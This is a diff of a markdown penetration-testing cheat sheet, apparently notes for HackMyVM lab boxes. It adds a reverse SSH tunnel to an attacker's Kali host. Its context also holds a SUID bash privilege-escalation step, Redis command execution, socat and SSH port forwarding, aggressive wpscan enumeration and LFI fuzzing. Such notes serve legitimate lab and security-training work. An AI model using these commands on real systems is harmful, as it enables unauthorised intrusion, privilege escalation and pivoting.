@@ -117,20 +117,23 @@ chmod +s /bin/bash
 > 1. if everything goes well, you should see "+OK"
 > 1. in redis run command: system.exec "id" and you should see "id" command output
 
-#### Portforwarding local service 8080
+#### SSH Port forwarding local service 8080
 > using **socat** for local port forwarding. In this example port 8080 is running locally and we will forward and make it public to 8089.\
 > socat TCP-LISTEN:8089,fork TCP:127.0.0.1:8080
 
 #### wpscan commands
 > 1.  wpscan -e ap --rua --disable-tls-checks --detection-mode aggressive --plugins-detection aggressive --url https://xxx.xxx
 
-#### Portforwarding local service 5901 (VNC) - HackMyVM Box Level
+#### Local --- SSH Port forwarding local service 5901 (VNC) - HackMyVM Box Level
 > 1. using SSH (Kali IP: 192.168.10.100, Level IP: 192.168.10.11).\
 > 1. there is a service running on port 5901 locally.\
 > 1. ss -tupln output --> 127.0.0.1:5901 (locally) && 0.0.0.0:65000 (global) && :80(global).\
 > 1. From Kali Box run: ssh -L 5901:localhost:5901 one@192.168.10.11 -p 65000.\
 > 1. Now you can acess that port 5901 locally i.e. (from Kali Box: http://127.0.0.1:5901) .\
 > 1. **VNC open session** vncviewer -passwd remote_level 127.0.0.1:5901
+
+#### Remote --- SSH Port forwarding local service 8080 to remote IP 8081  - HackMyVM Box Controller
+```ssh -R 192.168.10.101:8081:127.0.0.1:8080 root@<KALI IP> ```
 
 #### Fuzzing LFI
 > 1. wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathto
